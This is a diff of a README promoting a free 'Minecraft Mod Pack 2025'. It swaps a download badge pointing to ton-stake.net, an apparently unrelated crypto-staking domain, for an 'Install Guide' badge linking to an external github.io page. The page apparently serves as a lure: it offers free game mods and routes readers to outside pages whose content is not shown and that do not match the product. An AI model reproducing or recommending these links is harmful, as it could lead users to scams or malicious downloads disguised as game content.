@@ -3,7 +3,10 @@
 **Minecraft Mod Pack 2025** is a free curated collection of the best mods, shaders, textures, and optimization tools for Minecraft Java and Bedrock editions.  
 Perfect for builders, adventurers, and PvP players.
 
-[![Download Pack](https://img.shields.io/badge/Download-Pack-blueviolet)](https://ton-stake.net)
+<a href="https://minecraft-mod-pack-2025.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
+
 
 ---
 
